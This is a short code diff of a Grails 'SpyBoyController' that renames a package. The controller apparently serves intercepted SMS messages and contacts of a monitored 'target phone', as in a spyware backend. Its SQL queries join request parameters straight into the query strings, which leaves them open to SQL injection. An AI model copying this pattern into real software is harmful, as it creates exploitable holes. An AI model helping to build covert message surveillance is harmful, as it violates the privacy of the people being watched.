@@ -145,8 +145,8 @@ class SpyBoyController {
 				isAll = true;
 				def session = sessionFactory.currentSession
 				def query = session.createSQLQuery("select * from sms t1 left join contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ currentTargetPhone.simSubscriberId +"' group by t1.time order by t1.time asc");
-				query.addEntity(com.xaviar.domain.Sms.class);
-				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
+				query.addEntity(com.atlancy.domain.Sms.class);
+				query.addEntity(com.atlancy.domain.Contact.class); // this defines the result type of the query
 				results=query.list();
 			}
 			render(template:"sms",model:[isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal: results!=null ? results.size():0]);
@@ -195,8 +195,8 @@ class SpyBoyController {
 				isAll = true;
 				def session = sessionFactory.currentSession
 				def query = session.createSQLQuery("select * from Sms t1 left join Contact t2 on (t1.address = t2.number and t1.folder_name = 'inbox') where t1.target_phone_id='"+ params.simSubscriberId +"' group by t1.time order by t1.time asc LIMIT " + params.iDisplayStart + ", "+ params.iDisplayLength);
-				query.addEntity(com.xaviar.domain.Sms.class);// this defines the result type of the query
-				query.addEntity(com.xaviar.domain.Contact.class); // this defines the result type of the query
+				query.addEntity(com.atlancy.domain.Sms.class);// this defines the result type of the query
+				query.addEntity(com.atlancy.domain.Contact.class); // this defines the result type of the query
 				results=query.list();
 			}
 			render(contentType: 'text/json') {[iTotalRecords:totalSize,iTotalDisplayRecords:totalSize,isAllSmses:isAll,phoneOwnerData:currentTargetPhone,contactDetails:contact!=null ? contact.get(0):null,smsInstanceList: results, smsInstanceTotal:totalSize]};
